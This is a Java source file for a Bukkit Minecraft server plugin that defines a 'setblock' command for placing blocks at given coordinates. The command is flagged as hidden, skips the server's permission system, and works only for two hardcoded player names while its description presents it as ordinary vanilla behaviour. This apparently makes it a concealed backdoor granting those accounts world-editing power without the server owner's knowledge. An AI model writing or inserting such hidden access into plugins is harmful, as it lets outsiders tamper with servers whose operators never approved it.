package sylvessa.cb1337.commands;

import sylvessa.cb1337.Types.PluginCommand;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class SetBlockCommand implements PluginCommand {
    public String name() {
        return "setblock";
    }

    public String description() {
        return "Sets a block at a specified location, just like vanilla Minecraft.";
    }

    public boolean hidden() {
        return true;
    }

    public void execute(CommandSender sender, String[] args) {
        if (!sender.getName().equals("cirrusmutatus") && !sender.getName().equals("Scorner")) return;

        if (args.length < 4) {
            sender.sendMessage("Usage: /setblock <x> <y> <z> <block> [destroy|keep|replace]");
            return;
        }

        World world;
        if (sender instanceof Player) {
            world = ((Player) sender).getWorld();
        } else {
            world = Bukkit.getWorlds().get(0);
        }

        Location loc = parseLocation(sender, world, args[0], args[1], args[2]);
        if (loc == null) return;

        Material mat = Material.matchMaterial(args[3].replace("minecraft:", ""));
        if (mat == null) {
            sender.sendMessage("Unknown block type: " + args[3]);
            return;
        }

        String mode = args.length >= 5 ? args[4].toLowerCase() : "replace";

        Block block = world.getBlockAt(loc);

        switch (mode) {
            case "destroy":
                block.setType(Material.AIR);
                block.setType(mat);
                sender.sendMessage("Block destroyed and replaced with " + mat);
                break;
            case "keep":
                if (block.getType() == Material.AIR) {
                    block.setType(mat);
                    sender.sendMessage("Block placed: " + mat);
                } else {
                    sender.sendMessage("Block not replaced because target is not air.");
                }
                break;
            default:
                block.setType(mat);
                sender.sendMessage("Block set to " + mat);
                break;
        }
    }

    private Location parseLocation(CommandSender sender, World world, String xStr, String yStr, String zStr) {
        Location base = sender instanceof Player ? ((Player) sender).getLocation() : new Location(world, 0, 0, 0);

        double x = parseCoordinate(base.getX(), xStr);
        double y = parseCoordinate(base.getY(), yStr);
        double z = parseCoordinate(base.getZ(), zStr);

        if (y < 0 || y > world.getMaxHeight()) {
            sender.sendMessage("Y coordinate out of bounds: " + y);
            return null;
        }

        return new Location(world, x, y, z);
    }

    private double parseCoordinate(double current, String input) {
        if (input.startsWith("~")) {
            if (input.length() == 1) return current;
            return current + Double.parseDouble(input.substring(1));
        } else {
            return Double.parseDouble(input);
        }
    }
}
